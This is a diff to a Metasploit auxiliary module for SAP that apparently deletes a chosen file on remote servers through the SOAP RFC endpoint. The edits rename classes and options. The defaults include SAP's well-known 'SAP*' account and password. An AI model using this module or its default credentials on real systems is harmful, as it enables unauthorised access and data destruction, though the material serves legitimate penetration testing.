@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -20,9 +20,7 @@
 # just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -51,11 +49,11 @@ class Metasploit4 < Msf::Auxiliary
     register_options([
       Opt::RPORT(8000),
       OptString.new('CLIENT', [true, 'SAP Client', '001']),
-      OptString.new('USERNAME', [true, 'Username', 'SAP*']),
-      OptString.new('PASSWORD', [true, 'Password', '06071992']),
+      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
+      OptString.new('HttpPassword', [true, 'Password', '06071992']),
       OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),
       OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])
-    ], self.class)
+    ])
   end
 
   def run_host(ip)
@@ -80,7 +78,7 @@ class Metasploit4 < Msf::Auxiliary
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
